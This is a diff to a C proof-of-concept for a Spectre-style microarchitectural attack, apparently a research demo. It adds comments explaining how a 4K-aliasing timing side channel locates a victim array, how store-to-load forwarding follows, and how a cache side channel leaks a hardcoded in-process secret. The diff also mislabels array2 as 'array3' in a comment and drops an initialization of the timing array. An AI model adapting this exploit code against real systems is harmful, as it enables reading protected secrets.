@@ -11,6 +11,18 @@
 #endif
 
 /********************************************************************
+The attack details:
+
+Suppose that the attacker desires to obtain the value of secret but does not have access to `array1` and is unsure whether `array1` is aligned or not.
+By utilizing `array4` and performing a time side-channel attack that exploits the 4k alias latency cost, it becomes possible to identify
+the starting point of `array1`. Without this detection, it is not possible to test the speculated load to store forward technique that Herbert proposes.
+Once the attacker aligns `array3` with array1, they will be able to carry out the load to store forwarding technique that Herbert proposes.
+Finally, the attacker will utilize `array2` for the cache side-channel attack to determine the cache line number that was loaded from the cache.
+ This will reveal the byte that contains the secret value, as illustrated in `spectre.c`.
+
+********************************************************************/
+
+/********************************************************************
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 2048;
@@ -36,12 +48,13 @@ uint8_t array1[2048] = {
 };
 uint8_t unused2[64];
 
+//array3 the attacker has access to and will be used for the cache side-channel
 uint8_t array2[256 * 512];
 uint8_t unused3[64];
-//Array3 the attacker has access too and will be used for 4k Aliasing
+//array3 the attacker has access to and will be used for 4k Aliasing.
 __attribute__((aligned(4096))) uint8_t array3[2048];
 uint8_t unused4[64];
-//Array4 the attacker has access to and will be used to get array1 offset
+//Array4 the attacker has access to and will be used to get array1 offset exploiting a time channel.
 __attribute__((aligned(4096))) char array4[4096];
 
 
@@ -50,6 +63,7 @@ __attribute__((aligned(4096))) char array4[4096];
 char* secret = "The password is rootkea" ;
 
 void victim_function(size_t x){
+    /*Note: The attacker does not have access to array1*/
 	array1[x] = secret[x];
 }
 
@@ -120,7 +134,6 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 
 	for (i = 0; i < 256; i++) {
 		results[i] = 0;
-		times[i] = 0;
 	}
 
 	for (tries = 4000; tries > 0; tries--) {
@@ -138,7 +151,7 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 				/* Call the victim! */
 				victim_function(0);
 				
-				/* Read from the alias address of where the victim wrote to */
+				// Attempt to read from where the victim wrote to `array1`
 				junk = array4[i];
 			}
 			
@@ -146,12 +159,12 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 			times[i] += time2;
 		}
 
-		/* Figure out which offset took the highest access time - and add one to its score. */  
+		/* Increment highest access time offset.*/
 		uint64_t max_time = 0;
 		for (i = 0; i < 4096; i++) {
 			if (times[i] > max_time) {
-				max_time = times[i];
 				j = i;
+				max_time = times[i];
 			}
 		}
 		results[j]++;
@@ -168,8 +181,6 @@ int GetUserArrayOffset(int score[2], uint8_t value[2])
 				k = i;
 			}
 		}
-		//if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-		//	break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
 	value[0] ^= junk; /* use junk so code above won't get optimized out */
 	value[0] = (uint8_t)j;
